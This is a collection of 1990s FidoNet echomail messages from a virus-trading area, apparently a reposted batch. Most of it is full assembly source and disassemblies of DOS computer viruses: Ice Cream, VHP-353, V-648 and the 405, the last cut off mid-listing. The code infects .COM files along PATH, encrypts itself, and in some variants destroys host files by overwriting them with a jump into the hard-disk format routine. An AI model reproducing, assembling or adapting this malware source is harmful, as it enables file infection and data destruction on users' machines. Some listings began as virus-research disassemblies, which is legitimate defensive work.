        mov     di,offset Filename
        push    di
        xor     bx,bx

CopyFilename:
        mov     cx,50h
        inc     bx
        lodsb
        cmp     al,0
        jne     StoreFilename           ;Change zero at end of
        mov     al,0Dh                  ;filename to a return

StoreFilename:
        stosb
        cmp     al,0Dh                  ;If it was a return, we're
        loopnz  CopyFilename            ;done copying the filename

        mov     byte ptr ds:[28fh],bl
        push    cs
        pop     ds
        pop     si
        dec     si
        int     2Eh                     ;Re-execute EXE file with
                        ;Stealth handler in memory,
                        ;so Exe is run w/o virus.

Terminate:
        mov     ah,4Ch
        int     21h

        db      0
Filename        db      1

end     start

-+-  Terminate 1.50/Pro
 + Origin: Fred's Place (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/zi,/zd,/zn   Debug info: zi=full, zd=line numbers only, zn=none

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 72 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:15 
 To   : -  *.*  -                                                               
 Subj : ICECREAM.ASM                                                            
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5fea
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Dr T , 2:283/718 (06 Nov 94 17:48)
* To   : Ron Toler
* Subj : ICECREAM.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Dr.T.@f718.n283.z2.fidonet.org
;Icecream Virus by the TridenT virus research group.

;This is a simple direct-action com virus that uses one of
;4 encryption algorithms to encrypt itself each time it infects a file.
;It will infect one .COM file in the current directory every time it is
;executed.  It marks infections with the time stamp.


;Disassembly by Black Wolf

.model tiny
.code
        org     100h

start:
        db      0e9h,0ch,0       ;jmp     Virus_Entry

Author_Name     db      'John Tardy'

        db      0E2h,0FAh
Virus_Entry:
        push    ax
        call    Get_Offset
Get_Offset:
        pop     ax
        sub     ax,offset Get_Offset

        db      89h,0c5h         ;mov     bp,ax
        lea     si,[bp+Storage]
        mov     di,100h                 ;Restore file
        movsw
        movsb

        mov     ah,1Ah
        mov     dx,0f900h
        int     21h                     ;Set DTA

        mov     ah,4Eh

FindFirstNext:
        lea     dx,[bp+ComMask]
        xor     cx,cx
        int     21h                     ;Find File
        jnc     InfectFile

Restore_DTA:
        mov     ah,1Ah
        mov     dx,80h
        int     21h                     ;Set DTA to default

        mov     bx,offset start
        pop     ax                      ;Return to host
        push    bx
        retn

InfectFile:
        mov     ax,4300h
        mov     dx,0f91eh
        int     21h                     ;Get file attribs

        push    cx                      ;save 'em
        mov     ax,4301h
        xor     cx,cx
        int     21h                     ;Set them to 0

        mov     ax,3D02h
        int     21h                     ;Open file

        mov     bx,5700h
        xchg    ax,bx
        int     21h                     ;Get file time

        push    cx
        push    dx                      ;save it
        and     cx,1Fh
        cmp     cx,1                    ;check for infection
        jne     ContinueInfection
        db      0e9h,69h,0              ;jmp     DoneInfect

ContinueInfection:
        mov     ah,3Fh
        lea     dx,[bp+Storage]
        mov     cx,3
        int     21h                     ;Read in first 3 bytes

        mov     ax,cs:[Storage+bp]
        cmp     ax,4D5Ah                ;Is it an EXE?
        je      DoneInfect
        cmp     ax,5A4Dh
        je      DoneInfect              ;Other EXE signature?

        pop     dx
        pop     cx
        and     cx,0FFE0h               ;Change stored time values
        or      cx,1                    ;to mark infection
        push    cx
        push    dx

        mov     ax,4202h                ;Go to the end of the file
        call    Move_FP
        sub     ax,3
        mov     cs:[JumpSize+bp],ax        ;Save jump size

        add     ax,10Fh                    ;Save encryption starting
        mov     word ptr [bp+EncPtr1+1],ax ;point....
        mov     word ptr [bp+EncPtr2+1],ax
        mov     word ptr [bp+EncPtr3+1],ax
        mov     word ptr [bp+EncPtr4+1],ax
        call    SetupEncryption            ;Encrypt virus

        mov     ah,40h
        mov     dx,0fa00h
        mov     cx,1F5h
        int     21h                     ;Write virus to file

        mov     ax,4200h
        call    Move_FP                 ;Go to the beginning of file

        mov     ah,40h
        lea     dx,[bp+JumpBytes]
        mov     cx,3
        int     21h                     ;Write in jump

        call    FinishFile
        jmp     Restore_DTA

DoneInfect:
        call    FinishFile
        mov     ah,4Fh
        jmp     FindFirstNext

Move_FP:
        xor     cx,cx
        xor     dx,dx
        int     21h
        ret

FinishFile:
        pop     si dx cx
        mov     ax,5701h                ;Reset file time/date stamp
        int     21h                     ;(or mark infection)

        mov     ah,3Eh
        int     21h                     ;Close new host file

        mov     ax,4301h
        pop     cx
        mov     dx,0fc1eh
        int     21h                     ;Restore old attributes

        push    si
        retn

Message         db      ' I scream, you scream, we both '
        db      'scream for an ice-cream! '

SetupEncryption:
        xor     byte ptr [bp+10Dh],2
        xor     ax,ax
        mov     es,ax
        mov     ax,es:[46ch]            ;Get random number
        push    cs
        pop     es
        push    ax
        and     ax,7FFh
        add     ax,1E9h
        mov     word ptr [bp+EncSize1+1],ax
        mov     word ptr [bp+EncSize2+1],ax
        mov     word ptr [bp+EncSize3+1],ax
        mov     word ptr [bp+EncSize4+1],ax
        pop     ax
        push    ax
        and     ax,3
        shl     ax,1
        mov     si,ax
        mov     ax,[bp+si+EncData1]
        add     ax,bp
        mov     si,ax
        lea     di,[bp+103h]
        movsw
        movsw
        movsw
        movsw                   ;Copy Encryption Algorithm
        pop     ax
        stosb
        movsb
        mov     dl,al
        lea     si,[bp+103h]
        mov     di,0fa00h
        mov     cx,0Ch
        rep     movsb
        lea     si,[bp+10Fh]
        mov     cx,1E9h

EncryptVirus:
        lodsb
        db      30h,0d0h                ;xor     al,dl
        stosb
        loop    EncryptVirus

        cmp     dl,0
        je      KeyWasZero
        retn

KeyWasZero:                                     ;If key is zero, increase
        mov     si,offset AuthorName    ;jump size and place name
        mov     di,0fa00h               ;at beginning....
        mov     cx,0Ah
        rep     movsb
        mov     ax,cs:[JumpSize+bp]
        add     ax,0Ch
        mov     cs:[JumpSize+bp],ax
        retn

        db      '[TridenT]'

EncData1        dw      02beh
EncData2        dw      02c7h
EncData3        dw      02d0h
EncData4        dw      02d9h

Encryptions:
;------------------------------------------------------------
EncPtr1:
        mov     si,0
EncSize1:
        mov     cx,0
        xor     byte ptr [si],46h
;------------------------------------------------------------
EncPtr2:
        mov     di,0
EncSize2:
        mov     cx,0
        xor     byte ptr [di],47h
;------------------------------------------------------------
EncSize3:
        mov     cx,0
EncPtr3:
        mov     si,0
        xor     byte ptr [si],46h
;------------------------------------------------------------
EncSize4:
        mov     cx,0
EncPtr4:
        mov     di,0
        xor     byte ptr [di],47h
;------------------------------------------------------------

AuthorName      db      'John Tardy'

JumpBytes       db      0E9h
JumpSize        dw      0

ComMask         db      '*.CoM',0

Storage         dw      20CDh
        db      21h

end     start

-+-  GEcho 1.10+
 + Origin: This virus is Microsoft Windows (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/x            Include false conditionals in listing

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 73 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:15 
 To   : -  *.*  -                                                               
 Subj : V_VHP353.ASM                                                            
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5ff3
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Bryan Sullivan, 2:283/718 (06 Nov 94 17:49)
* To   : Adam Happ
* Subj : V_VHP353.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Bryan.Sullivan@f718.n283.z2.fidonet.org
    page    ,132
    name    VHP_353
    title   Virus; based on the famous VHP-648 virus
    .radix  16

code    segment
    assume  cs:code,ds:code

    org 100

environ equ 2C

newjmp  equ 7Bh     ;Code of jmp instruction
codeptr equ 7A      ;Here is formed a jump to the virus code
pname   equ 78      ;Offset of file name in the dir path
poffs   equ 76      ;Offset in the contents of the `PATH' variable
errhnd  equ 74      ;Save place for the old error handler
fname   equ 70      ;Path name to search for
mydta   equ 2C      ;DTA for Find First/Next:
attrib  equ 17      ;File attribute
time    equ 16      ;File time
date    equ 14      ;File date
fsize   equ 12      ;File size
namez   equ 0E      ;File name found

start:
    jmp short begin
    nop
    int 20

saveins db  3 dup (90)  ;Original first 3 bytes

begin:
    call    virus       ;Detrmine the virus start address

data    label   byte        ;Data section

allcom  db  '*.COM',0       ;Filespec to search for
pathstr db  'PATH='

;This replaces the first instruction of a destroyed file.
;It's a JMP instruction into the hard disk formatting program (IBM XT only):

bad_jmp db  0EA,6,0,0,0C8

virus:
    pop bx      ;Make BX pointed at data
    mov di,offset start ;Push the program true start address
    push    di      ; onto the stack
    push    ax      ;Save AX

    cld
    lea si,[bx+saveins-data]    ;Original instruction saved there
    movsw           ;Move 2 + 1 bytes
    movsb
    mov si,bx       ;Keep SI pointed at data

    lea bp,[bx+endcode-data+7A] ;Reserve local storage

    mov ax,3524     ;Get interrupt 24h handler
    int 21      ; and save it in errhnd

    mov [bp-errhnd],bx
    mov [bp-errhnd+2],es

    mov ah,25       ;Set interrupt 24h handler
    lea dx,[si+handler-data]
    cmp al,0        ;DOS < 2.0 zeroes AL
    je  exit        ;Exit if version < 2.0
    push    ds
    int 21

    lea dx,[bp-mydta]
    mov ax,1A00     ;Set DTA
    int 21

    xor di,di       ;Point ES:DI at the environment start
    mov es,ds:[di+environ]  ;Environment address
    mov bx,si
search:             ;Search 'PATH' in the environment
    lea si,[bx+pathstr-data]
    mov cx,5        ;5 letters in 'PATH='
    repe    cmpsb
    je  pfound      ;PATH found, continue
    mov ch,80       ;Maximum 32 K in environment
    repne   scasb       ;If not, skip through next 0
    scasb           ;End of environment?
    dec di
    jc  search      ;If not, retry
pfound:
    pop es      ;Restore ES

    mov [bp-poffs],di   ;Save 'PATH' offset in poffs
    lea di,[bp-fname]
    mov [bp-pname],di

filesrch:
    lea si,[bx+allcom-data]
    movsw
    movsw           ;Move '*.COM' at fname
    movsw
    mov si,bx       ;Restore SI

    mov ah,4E       ;Find first file
    lea dx,[bp-fname]
    mov cl,11b      ;Hidden, Read/Only or Normal files
    jmp short findfile

checkfile:
    mov al,[bp-time]    ;Check file time
    and al,11111b   ; (the seconds, more exactly)
    cmp al,62d/2    ;Are they 62?

;If so, file is already contains the virus, search for another:

    je  findnext

;Is 10 <= file_size <= 64,000 bytes?

    sub word ptr [bp-fsize],10d
    cmp [bp-fsize],64000d-10d+1
    jc  process     ;If so, process the file

findnext:           ;Otherwise find the next file
    mov ah,4F       ;Find next file
findfile:
    int 21
    jnc checkfile   ;If found, go chech some conditions

nextdir:
    mov si,[bp-poffs]   ;Get the offset in the PATH variable
    lea di,[bp-fname]   ;Point ES:DI at fname
    mov ds,ds:[environ] ;Point DS:SI at the PATH variable found
    cmp byte ptr [si],0 ;0 means end of PATH
    jnz cpydir

olddta:
    mov ax,2524     ;Set interrupt 24h handler
    lds dx,dword ptr [bp-errhnd]
    int 21
    push    cs
    pop ds      ;Restore DS

exit:
    mov ah,1A       ;Set DTA
    mov dx,80       ;Restore DTA
    int 21

    pop ax
    ret         ;Go to CS:IP by doing funny RET

cpydir:
    lodsb           ;Get a char from the PATH variable
    cmp al,';'          ;`;' means end of directory
    je  enddir
    cmp al,0        ;0 means end of PATH variable
    je  enddir
    stosb           ;Put the char in fname
    jmp cpydir      ;Loop until done
enddir:
    push    cs
    pop ds      ;Restore DS
    mov [bp-poffs],si   ;Save the new offset in the PATH variable
    mov al,'\'          ;Add '\'
    stosb
    mov [bp-pname],di
    jmp filesrch    ;And go find the first *.COM file

process:
    mov di,dx       ;[bp-pname]
    lea si,[bp-namez]   ;Point SI at namez
cpyname:
    lodsb           ;Copy name found to fname
    stosb
    cmp al,0
    jne cpyname
    mov si,bx       ;Restore SI

    mov ax,4301     ;Set file attributes
    call    clr_cx_dos

    mov ax,3D02     ;Open file with Read/Write access
    int 21
    jc  oldattr     ;Exit on error
    mov bx,ax       ;Save file handle in BX

    mov ah,2C       ;Get system time
    int 21
    and dh,111b     ;Are seconds a multiple of 8?
    jnz infect      ;If not, contaminate file (don't destroy):

;Destroy file by rewriting the first instruction:

    mov cx,5        ;Write 5 bytes
    lea dx,[si+bad_jmp-data]    ;Write THESE bytes
    jmp short do_write  ;Do it

;Try to contaminate file:

;Read first instruction of the file (first 3 bytes) and save it in saveins:

infect:
    mov ah,3F       ;Read from file handle
    mov cx,3        ;Read 3 bytes
    lea dx,[si+saveins-data]    ;Put them there
    call    dos_rw
    jc  oldtime     ;Exit on error

;Move file pointer to end of file:

    mov ax,4202     ;LSEEK from end of file
    call    clr_dx_cx_dos

    mov [bp-codeptr],ax ;Save result in codeptr

    mov cx,endcode-saveins  ;Virus code length as bytes to be written
    lea dx,[si+saveins-data]    ;Write from saveins to endcode
    call    dos_write   ;Write to file handle
    jc  oldtime     ;Exit on error

    call    lseek       ;LSEEK to the beginning of the file

;Rewrite the first instruction of the file with a jump to the virus code:

    mov cl,3        ;3 bytes to write
    lea dx,[bp-newjmp]  ;Write THESE bytes
do_write:
    call    dos_write   ;Write to file handle

oldtime:
    mov dx,[bp-date]    ;Restore file date
    mov cx,[bp-time]    ; and time
    or  cl,11111b   ;Set seconds to 62 (the virus' marker)

    mov ax,5701     ;Set file date & time
    int 21
    mov ah,3E       ;Close file handle
    int 21

oldattr:
    mov ax,4301     ;Set file attributes
    mov cx,[bp-attrib]  ;They were saved in attrib
    and cx,3F
    lea dx,[bp-fname]
    int 21      ;Do it
    jmp olddta      ;And exit

lseek:
    mov ax,4200     ;LSEEK from the beginning of the file
clr_dx_cx_dos:
    xor dx,dx       ;From the very beginning
clr_cx_dos:
    xor cx,cx       ;Auxiliary entry point
    db  3Dh     ;Trick
dos_write:
    mov ah,40       ;Write to file handle
dos_rw:
    int 21
    jc  dos_ret     ;Exit on error
    cmp ax,cx       ;Set CF if AX < CX
dos_ret:
    ret

handler:            ;Critical error handler
    mov al,0        ;Just ignore the error
    iret            ; and return

    db  0E9     ;The JMP opcode

endcode label   byte

code    ends
    end start

-+-  GoldED/386 2.50.B1016+
 + Origin: The PRO-Point on a PRO-BBS and a PRO-*.* ...Ciaro?... (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/t            Suppress messages if successful assembly

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 74 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:16 
 To   : -  *.*  -                                                               
 Subj : V_648.DIS                                                               
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf6034
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Clif Jessop, 2:283/718 (06 Nov 94 17:50)
* To   : Edwin Cleton
* Subj : V_648.DIS
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Clif.Jessop@f718.n283.z2.fidonet.org
RET_NEAR_POP    MACRO   X
DB  0C2H
DW  X
ENDM

cseg    segment
    assume  cs:cseg
    org $+100h

L0100:  JMP L5BAA

    org 5baah

L5BAA:  PUSH    CX
    MOV DX,OFFSET L5DA3

    CLD             ;odtworzenie zmienionego kawalka
    MOV SI,DX
    ADD SI,0AH
    MOV DI,OFFSET L0100
    MOV CX,3
    REPZ    MOVSB

    MOV SI,DX           ;baza obszaru danych

    MOV AH,30H          ;Get MS-DOS version number
    INT 21H
    CMP AL,0            ;Major version number
    JNZ L5BCA
    JMP L5D91

L5BCA:  PUSH    ES
    MOV AH,2FH          ;Get DTA
    INT 21H
    MOV DS:[SI],BX      ;schowanie starego DTA
    MOV DS:[SI+2],ES
    POP ES

    MOV DX,5FH          ;nowe DTA
    NOP
    ADD DX,SI
    MOV AH,1AH          ;Set DTA
    INT 21H

    PUSH    ES          ;<- szukanie PATH=
    PUSH    SI
    MOV ES,DS:2CH       ;Environment
    MOV DI,0            ;adres w environmencie
L5BEB:  POP SI
    PUSH    SI
    ADD SI,1AH          ;wzorzec PATH=
    LODSB
    MOV CX,8000h
    REPNZ   SCASB
    MOV CX,4
L5BFA:  LODSB
    SCASB
    JNZ L5BEB           ;-> to nie to
    LOOP    L5BFA
    POP SI
    POP ES

    MOV ds:[SI+16H],DI      ;adres zawartosci path'a
    MOV DI,SI
    ADD DI,1FH          ;obszar roboczy
;   PATCH83
    MOV BX,SI
    ADD SI,1FH          ;obszar roboczy
    MOV DI,SI
    JMP SHORT   L5C50

;<------zmiana katalogu
L5C16:  CMP WORD PTR ds:[SI+16H],0  ;adres zawartosci path'a
    JNZ L5C20
    JMP L5D83

L5C20:  PUSH    DS
    PUSH    SI
    MOV DS,ES:2CH       ;segment environmentu
    MOV DI,SI
    MOV SI,ES:[DI+16H]      ;adres zawartosci path'a
    ADD DI,1FH
;   PATCH83
L5C32:  LODSB
    CMP AL,';'          ;czy koniec pozycji ?
    JZ  L5C41
    CMP AL,0            ;koniec environmentu
    JZ  L5C3E           ;-> tak
    STOSB
    JMP SHORT   L5C32

L5C3E:  MOV SI,0            ;znacznik, ze wiecej juz nie ma
L5C41:  POP BX
    POP DS
    MOV ds:[BX+16H],SI      ;schowanie nowego pointera
    CMP BYTE PTR [DI-1],'\' ;czy zakonczone back-slashem
    JZ  L5C50           ;-> tak
    MOV AL,'\'          ;uzupelnienie
    STOSB

L5C50:  MOV ds:[BX+18H],DI      ;adres poczatku nazwy zbioru w path
    MOV SI,BX
    ADD SI,10H          ;'*.com'
    MOV CX,6
    REPZ    MOVSB
    MOV SI,BX
    MOV AH,4EH          ;Find First File
    MOV DX,1FH          ;pointer na pathname
    NOP
    ADD DX,SI
    MOV CX,3            ;Attrributes to match ro+hidden+zwykle
    INT 21H
    JMP SHORT   L5C74

L5C70:  MOV AH,4FH          ;find next
    INT 21H
L5C74:  JNB L5C78           ;-> znaleziono
    JMP SHORT   L5C16       ;-> na nastepny katalog

L5C78:  MOV AX,ds:[SI+75H]      ;Time file was last written
    AND AL,1FH          ;czy juz zawirusowany ?
    CMP AL,1FH
    JZ  L5C70               ;-> tak, odpuszczamy takim
    CMP WORD PTR ds:[SI+79H],0FA00h ;low word of file size
    JA  L5C70               ;-> odpuszczamy zbyt duzym
    CMP WORD PTR ds:[SI+79H],0AH
    JB  L5C70           ;-> odpuszczamy zbyt malym
    MOV DI,ds:[SI+18H]      ;adres nazwy zbioru w path

    PUSH    SI
    ADD SI,7DH          ;nazwa znalezionego zbioru
L5C9A:  LODSB
    STOSB
    CMP AL,0
    JNZ L5C9A
    POP SI

    MOV AX,4300h        ;Get file attributes
    MOV DX,1FH          ;pathname
    NOP
    ADD DX,SI
    INT 21H
    MOV ds:[SI+8],CX        ;Attribute byte

    MOV AX,4301h        ;Set attributes
    AND CX,0FFFEh       ;-read/only
    MOV DX,1FH          ;pathname
    NOP
    ADD DX,SI
    INT 21H

    MOV AX,3D02h        ;Open file/write
    MOV DX,1FH          ;pathname
    NOP
    ADD DX,SI
    INT 21H
    JNB L5CCF
    JMP L5D74

L5CCF:  MOV BX,AX           ;<- open O.K.
    MOV AX,5700h        ;Get date & time of file
    INT 21H
    MOV ds:[SI+4],CX        ;schowanie daty ostatniej modyfikacji
    MOV ds:[SI+6],DX

    MOV AH,2CH          ;Get Time
    INT 21H

    AND DH,7            ;ktory wariant ?
    JNZ L5CF7           ;-> rozmnozenie

                    ;<- destrukcja
    MOV AH,40H          ;Write handle
    MOV CX,5            ;bytes
    MOV DX,SI           ;pointer to buffer
    ADD DX,8AH
    INT 21H
    JMP SHORT   L5D5B

    NOP             ;<- rozmnozenie
L5CF7:  MOV AH,3FH          ;Read handle
    MOV CX,3            ;bytes
    MOV DX,0AH          ;buffer offset
    NOP
    ADD DX,SI
    INT 21H
    JB  L5D5B           ;-> blad
    CMP AX,3            ;bytes read
    JNZ L5D5B           ;zbyt malo

    MOV AX,4202h        ;Move file pointer end+offset
    MOV CX,0            ;offset
    MOV DX,0            ;offset
    INT 21H
    JB  L5D5B           ;-> blad
    MOV CX,AX           ;adres konca
    SUB AX,3            ;minus dlugosc jump'u
    MOV ds:[SI+0EH],AX      ;nowe 3 pierwsze bajty
    ADD CX,02F9h
    MOV DI,SI
    SUB DI,01F7h
    MOV [DI],CX         ;<- adres zmiennych
    MOV AH,40H          ;write handle
    MOV CX,0288h        ;dlugosc wirusa
    MOV DX,SI           ;poczatek wirusa
    SUB DX,01F9h
    INT 21H
    JB  L5D5B           ;-> blad

    CMP AX,0288h        ;czy wszystko zapisano
    JNZ L5D5B           ;-> nie
    MOV AX,4200         ;Move file pointer poczatek
    MOV CX,0            ;offset
    MOV DX,0            ;offset
    INT 21H
    JB  L5D5B           ;-> blad

    MOV AH,40H          ;write
    MOV CX,3            ;dlugosc
    MOV DX,SI           ;buffer
    ADD DX,0DH
    INT 21H
L5D5B:  MOV DX,ds:[SI+6]        ;koniec obrobki zbioru
    MOV CX,ds:[SI+4]
    AND CX,0FFE0h       ;znacznik zawirusowania - czas
    OR  CX,1FH
    MOV AX,5701h        ;Set Date/Time of File
    INT 21H
    MOV AH,3EH          ;Close handle
    INT 21H
                    ;<- blad otwarcia zbioru
L5D74:  MOV AX,4301h        ;Set File attributes
    MOV CX,ds:[SI+8]
    MOV DX,1FH
    NOP
    ADD DX,SI
    INT 21H

L5D83:  PUSH    DS
    MOV AH,1AH          ;Set DTA
    MOV DX,ds:[SI+0]        ;poprzednia wartosc
    MOV DS,ds:[SI+2]        ;poprzednia wartosc
    INT 21H
    POP DS

L5D91:  POP CX          ;<- gdy dos < 2.0
    XOR AX,AX
    XOR BX,BX
    XOR DX,DX
    XOR SI,SI
    MOV DI,0100h        ;adres restartu
    PUSH    DI
    XOR DI,DI
    RET_NEAR_POP    0FFFFH

L5DA3   label   word            ;<- poczatek zmiennych programu
x0000   equ $-l5da3
    dw  0080h,440Ch     ;adres DTA oryginalny
x0004   equ $-l5da3
    Dw  6d60H           ;Time file last written
x0006   equ $-l5da3
    Dw  0a67H           ;Date file last written
x0008   dw  0020h           ;file attribute - oryginal
x000a   equ $-l5da3
    db  0E9h,0ADh,0Bh       ;schowana poprzednia zawartosc [100h]
x000d   equ $-l5da3
    db  0E9h,0A7h,5ah       ;zapisywane do zbioru
x0010   equ $-l5da3
    DB  '*.COM',0       ;wzorzec do szukania
x0016   equ $-l5da3
    dw  001CH           ;adres path= w environmencie
x0018b  equ $-l5da3
    dw  65F3H           ;adres nazwy zbioru w path x001f
x001a   equ $-l5da3
    db  'PATH='         ;szukane w environmencie
;---------------------------------------
x001f   equ $-l5da3
    db  'COMMAND.COM',0     ;nazwa obrabianego zbioru
    db  'OM',0
    db  'M',0
    db  'COM',0
    db  'OM',0
    db  '                    '
    db  '                    '

;----------------------------------------
x005f   equ $-l5da3         ;<- nowe DTA
    db  1,'????????COM',3,2 ;reserved area
    db  ?,?
    DB  0,0,0,0,0,0,0
    db  20h         ;attribute found
x0075   equ $-l5da3
    dw  6d60h           ;Time file was last written
    dw  0a67h           ;date file was last written
x0079   equ $-l5da3
    Dw  5AAAH           ;Low word of file size
    Dw  0           ;High word of file size
x007d   equ $-l5da3
    db  'COMMAND.COM',0,0   ;name and extension
;----------------------------------------

x008a   equ $-l5da3         ;zapisywane do zbioru
    db  0EAH,0F0H,0FFH,0,0F0H   ;jmp    0f000:0fff0h

cseg    ENDS

    END L0100

-+-  DinoMail v.1.0 Alpha
 + Origin: Hans' Point with DOSBoss West, Amsterdam (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/Txx          Specify output file type

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 75 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:16 
 To   : -  *.*  -                                                               
 Subj : 405_B.ASM                                                               
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf603a
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Doug Bryce, 2:283/718 (06 Nov 94 17:51)
* To   : Mike Nisbett
* Subj : 405_B.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Doug.Bryce@f718.n283.z2.fidonet.org
    title   The '405' virus
    page    65,132
; ╔══════════════════════════════════════════════════════════════════════════╗
; ·                 British Computer Virus Research Centre                   ·
; ·  12 Guildford Street,   Brighton,   East Sussex,   BN1 3LS,   England    ·
; ·  Telephone:     Domestic   0273-26105,   International  +44-273-26105    ·
; ·                                                                          ·
; ·                             The '405' Virus                              ·
; ·                Disassembled by Joe Hirst,      March 1989                ·
; ·                                                                          ·
; ·                      Copyright (c) Joe Hirst 1989.                       ·
; ·                                                                          ·
; ·      This listing is only to be made available to virus researchers      ·
; ·                or software writers on a need-to-know basis.              ·
; ╚══════════════════════════════════════════════════════════════════════════╝

    ; The virus overwrites the first 405 bytes of a COM file.  If the
    ; length of the COM file is less than this, the length is increased
    ; to 405 bytes.

    ; The disassembly has been tested by re-assembly using MASM 5.0.

BUFFER  SEGMENT AT 0

    ORG 295H
DW0295  DW  ?
DB0297  DB  ?

    ORG 0E000H
DWE000  DW  ?           ; Read buffer area

    ORG 0E195H
DWE195  DW  ?           ; Program after virus

BUFFER  ENDS

CODE    SEGMENT BYTE PUBLIC 'CODE'
    ASSUME CS:CODE,DS:NOTHING,ES:BUFFER

VIRLEN  EQU OFFSET ENDADR-START
    ORG 100H

START:  XCHG    SI,AX
    ADD [BX+SI],AL
    SAHF
    ADD [BX+SI],AL
    NOP

    MOV AX,0            ; Clear register
    MOV ES:DB0249,AL        ; Set current disk to default
    MOV ES:DB024B,AL        ; Set pathname store to zero
    MOV ES:DB028B,AL        ; Set number of drives to zero
    PUSH    AX
    MOV AH,19H          ; Get current disk function
    INT 21H         ; DOS service
    MOV ES:DB0249,AL        ; Save current disk
    MOV AH,47H          ; Get current directory function
    ADD AL,1            ; Next drive (A)
    PUSH    AX
    MOV DL,AL           ; Drive A
    LEA SI,DB024B       ; Pathname store
    INT 21H         ; DOS service
    POP AX
    MOV AH,0EH          ; Select disk function
    SUB AL,1            ; Convert drive for select function
    MOV DL,AL           ; Move drive
    INT 21H         ; DOS service
    MOV ES:DB028B,AL        ; Save number of drives
BP0139: MOV AL,ES:DB0249        ; Get current disk
    CMP AL,0            ; Is drive A?
    JNZ BP0152          ; Branch if not
    MOV AH,0EH          ; Select disk function
    MOV DL,2            ; Change drive to B
    INT 21H         ; DOS service
    MOV AH,19H          ; Get current disk function
    INT 21H         ; DOS service
    MOV ES:DB024A,AL        ; Save new current drive
    JMP BP0179

BP0152: CMP AL,1            ; Is drive B?
    JNZ BP0167          ; Branch if not
    MOV AH,0EH          ; Select disk function
    MOV DL,2            ; Change drive to C
    INT 21H         ; DOS service
    MOV AH,19H          ; Get current disk function
    INT 21H         ; DOS service
    MOV ES:DB024A,AL        ; Save new current drive
    JMP BP0179

BP0167: CMP AL,2            ; Is drive C?
    JNZ BP0179          ; Branch if not
    MOV AH,0EH          ; Select disk function
    MOV DL,0            ; Change drive to A
    INT 21H         ; DOS service
    MOV AH,19H          ; Get current disk function
    INT 21H         ; DOS service
    MOV ES:DB024A,AL        ; Save new current drive
BP0179: MOV AH,4EH          ; Find first file function
    MOV CX,1            ; Find read-only files, not system
    LEA DX,DB028C       ; Path '*.COM'
    INT 21H         ; DOS service
    JB  BP0189          ; Branch if error
    JMP BP01A9          ; Process COM file

BP0189: MOV AH,3BH          ; Change current directory function
